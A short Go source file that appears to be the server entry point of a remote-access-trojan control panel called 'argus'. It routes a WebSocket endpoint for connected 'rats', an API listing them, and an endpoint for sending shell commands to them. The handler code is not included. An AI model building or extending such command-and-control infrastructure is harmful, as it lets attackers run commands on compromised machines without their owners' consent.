package main

import (
	"argus/backend/handlers"
	"log"
	"net/http"
	"path/filepath"
)

func main() {
	staticPath := filepath.Join("backend", "static")
	http.Handle("/_app/", http.StripPrefix("/_app/", http.FileServer(http.Dir(filepath.Join(staticPath, "_app")))))

	// Serve frontend routes
	http.HandleFunc("/", handlers.ServeFrontend)

	// WebSocket endpoint for rats
	http.HandleFunc("/ws", handlers.WebSocketHandler)

	// API endpoint to get all rats
	http.HandleFunc("/api/rats", handlers.GetRats)

	// API endpoint to send shell commands
	http.HandleFunc("/api/shell/", handlers.ShellCommandHandler)

	log.Println("Server starting on localhost:8080")
	if err := http.ListenAndServe(":8080", nil); err != nil {
		log.Fatal(err)
	}
}
